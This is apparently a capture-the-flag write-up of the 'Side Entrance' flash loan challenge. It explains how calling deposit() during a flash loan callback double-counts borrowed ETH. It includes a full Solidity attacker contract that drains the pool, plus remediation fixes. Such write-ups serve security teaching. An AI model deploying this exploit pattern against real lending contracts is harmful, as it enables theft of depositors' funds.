# Challenge #10: Side Entrance

- **Difficulty**: Medium
- **Category**: Flash Loan Accounting
- **Severity**: Critical
- **Status**: SOLVED

## Overview

A flash loan pool allows ETH deposits and withdrawals while also offering flash loans. The pool tracks user balances internally and verifies flash loan repayment by checking that its ETH balance does not decrease. The critical flaw is that the `deposit()` function can be called during a flash loan callback, allowing borrowed funds to be "repaid" as a deposit.

## Vulnerability

The flash loan mechanism checks repayment by comparing the pool's ETH balance before and after:

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    if (address(this).balance < balanceBefore) revert RepayFailed();
}
```

The `deposit()` function increases both the pool's ETH balance AND the caller's internal balance:

```solidity
function deposit() external payable {
    unchecked {
        balances[msg.sender] += msg.value;
    }
}
```

The vulnerability: calling `deposit()` inside the flash loan callback satisfies the balance check (ETH returns to the pool) while simultaneously crediting the attacker's internal balance. The same ETH is counted twice — once as a flash loan repayment and once as a user deposit.

## Exploit Walkthrough

**Step 1**: Deploy an attacker contract that implements `IFlashLoanEtherReceiver`:

```solidity
contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    function attack() external {
        pool.flashLoan(address(pool).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() external {
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```

**Step 2**: Call `attack()` — this borrows the pool's entire ETH balance via flash loan.

**Step 3**: Inside `execute()`, the borrowed ETH is deposited back via `deposit()`. This:
- Returns the ETH to the pool (satisfies `address(this).balance >= balanceBefore`)
- Credits `balances[attacker] += poolBalance`

**Step 4**: Call `withdraw()` — the attacker's internal balance equals the pool's total holdings, so all ETH is withdrawn.

The net result: the entire pool is drained in a single transaction.

## Real-World Impact

- **Euler Finance (March 2023, ~$197M)**: The largest DeFi hack of 2023 exploited a similar accounting confusion where donated/deposited funds and debt accounting could be manipulated through flash loans. The attacker used a "donation" mechanism that is conceptually identical to the deposit-as-repayment trick here.
- **bZx (multiple incidents)**: Flash loan + accounting manipulation patterns have appeared across multiple bZx exploits where borrowed funds were redeposited to satisfy invariants.
- The general pattern — using one mechanism (deposit) to satisfy another's invariant (flash loan repayment) when they share the same balance — is a canonical DeFi vulnerability.

## Remediation

```solidity
// Fix 1: Separate flash loan accounting from deposits
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    _flashLoanActive = true;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    _flashLoanActive = false;

    if (address(this).balance < balanceBefore) revert RepayFailed();
}

function deposit() external payable {
    require(!_flashLoanActive, "Cannot deposit during flash loan");
    balances[msg.sender] += msg.value;
}

// Fix 2: Use a dedicated repayment function
function flashLoan(uint256 amount) external {
    _flashLoanDebt[msg.sender] = amount;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    require(_flashLoanDebt[msg.sender] == 0, "Loan not repaid");
}

function repayFlashLoan() external payable {
    _flashLoanDebt[msg.sender] -= msg.value;
}

// Fix 3: Track internal balance separately from ETH balance
uint256 private _totalDeposits;
// Check: address(this).balance >= _totalDeposits + flashLoanAmount
```

## Key Takeaway

Flash loan repayment checks must be isolated from deposit mechanisms — shared balance tracking allows double-counting exploits.
